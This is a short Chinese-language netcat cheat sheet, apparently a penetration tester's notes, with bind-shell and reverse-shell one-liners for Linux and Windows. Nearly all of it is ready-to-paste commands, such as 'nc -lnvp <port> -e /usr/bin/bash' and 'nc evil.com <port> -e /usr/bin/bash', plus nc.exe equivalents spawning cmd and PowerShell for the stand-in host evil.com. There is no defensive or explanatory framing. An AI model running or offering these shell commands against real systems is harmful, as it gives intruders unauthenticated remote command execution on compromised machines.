TCP/IP swiss army knife.

## 1. 正向连接

侦听端口，并在连接后开启终端

```
[root@centos7-6 ~]# nc -lnvp <port> -c bash
```

```
[root@centos7-6 ~]# nc -lnvp <port> -e /usr/bin/bash
```

```
PS C:\Users\Administrator> C:\path\nc.exe -lvnp <port> -e cmd
```

```
PS C:\Users\Administrator> C:\path\nc.exe -lvnp <port> -e powershell
```

连接目标端口

```
┌──(root㉿kali-23)-[~]
└─# nc -nv evil.com <port>
```

```
┌──(root㉿kali-23)-[~]
└─# nc evil.com <port>
```

```
PS C:\Users\Administrator> C:\path\nc.exe -nv evil.com <port>
```

```
PS C:\Users\Administrator> C:\path\nc.exe evil.com <port>
```

## 2. 反向链接

侦听端口

```
┌──(root㉿kali)-[~]
└─# nc -lnvp <port>
```

```
PS C:\Users\Administrator> C:\path\nc.exe -lvnp <port>
```

连接目标端口，并在连接后开启终端

```
[root@centos7-6 ~]# nc -nv evil.com <port> -c bash
```

```
[root@centos7-6 ~]# nc evil.com <port> -e /usr/bin/bash
```

```
PS C:\Users\Administrator> C:\path\nc.exe evil.com <port> -e cmd
```

```
PS C:\Users\Administrator> C:\path\nc.exe evil.com <port> -e powershell
```

---

**References**

- [netcat](https://www.kali.org/tools/netcat/)

